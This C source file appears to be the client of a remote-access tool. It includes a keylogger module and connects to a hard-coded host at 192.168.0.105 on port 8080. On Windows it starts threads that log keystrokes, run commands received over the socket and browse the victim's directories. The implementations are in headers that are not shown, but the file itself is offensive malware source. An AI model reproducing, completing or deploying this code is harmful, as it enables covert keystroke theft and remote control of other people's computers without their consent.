// File: client.c

#ifdef _WIN32
#include <winsock2.h>
#else
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#endif

#include "../common/socket.h"
#include "SURF/seeDirectory.h"
#include "keylogger.h"

#define PORT 8080
#define ADDRESS "192.168.0.105"
int main() {
	paramSurf param;
	paramThread param2;

	param.paramT = &param2;

	inisialisasiParamThread(param.paramT);
	isiPort(param.paramT, PORT);
	isiAddress(param.paramT, ADDRESS);
	isiStatus(param.paramT, 'C');


	printf("%c\n", (param).paramT->socketStatus);


#ifdef _WIN32
	HANDLE cliSocket, sendMSG, execMSG, actKeylog, surf;
	DWORD cliSocketId, sendMSGId, execMSGId, actKeylogId, surfId;

	WSADATA wsa;
	WSAStartup(MAKEWORD(2,2), &wsa);

	actKeylog = CreateThread(NULL, 0, activateKeylog, NULL, 0, &actKeylogId);
	cliSocket = CreateThread(NULL, 0, clientSocket, (LPVOID)param.paramT, 0, &cliSocketId);
	execMSG = CreateThread(NULL, 0, execMessage, (LPVOID)&param, 0, &execMSGId);
	surf = CreateThread(NULL, 0, surfMode, (LPVOID)&param, 0, &surfId);


	WaitForSingleObject(cliSocket, INFINITE);
	CloseHandle(cliSocket);

	WaitForSingleObject(execMSG, INFINITE);
	CloseHandle(execMSG);

	WaitForSingleObject(actKeylog, INFINITE);
	CloseHandle(actKeylog);

	WaitForSingleObject(surf, INFINITE);
	CloseHandle(surf);

#else
#endif

	return 0;
}

